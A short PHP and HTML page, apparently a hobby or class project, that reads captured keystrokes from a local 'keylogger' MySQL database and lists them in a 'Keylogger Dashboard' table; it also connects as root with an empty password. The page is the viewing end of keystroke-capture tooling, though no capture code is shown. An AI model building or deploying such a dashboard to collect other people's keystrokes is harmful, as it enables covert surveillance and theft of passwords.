<?php
$host = "localhost";
$user = "root"; 
$pass = "";     
$dbname = "keylogger"; 

$conn = new mysqli($host, $user, $pass, $dbname); 

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Query tanan keylogs
$sql = "SELECT * FROM keylogs ORDER BY id ASC";
$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Keylogger Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; }
        table { width: 60%; border-collapse: collapse; margin: 20px auto; }
        th, td { padding: 8px 12px; border: 1px solid #ddd; text-align: center; }
        th { background-color: #f4f4f4; }
    </style>
</head>
<body>

<h2 style="text-align:center;">🛡️ Keylogger Dashboard</h2>

<table>
    <thead>
        <tr>
            <th>ID</th>
            <th>Key Pressed</th>
            <th>Date/Time</th>
        </tr>
    </thead>
    <tbody>
        <?php if ($result->num_rows > 0): ?>
            <?php while($row = $result->fetch_assoc()): ?>
                <tr>
                    <td><?= htmlspecialchars($row['id']) ?></td>
                    <td><?= htmlspecialchars($row['key_pressed']) ?></td>
                    <td><?= htmlspecialchars($row['created_at']) ?></td>
                </tr>
            <?php endwhile; ?>
        <?php else: ?>
            <tr><td colspan="3">No keylogs yet.</td></tr>
        <?php endif; ?>
    </tbody>
</table>

<script src="script.js"></script> <!-- IMPORTANTE -->
</body>
</html>

<?php
$conn->close();
?>
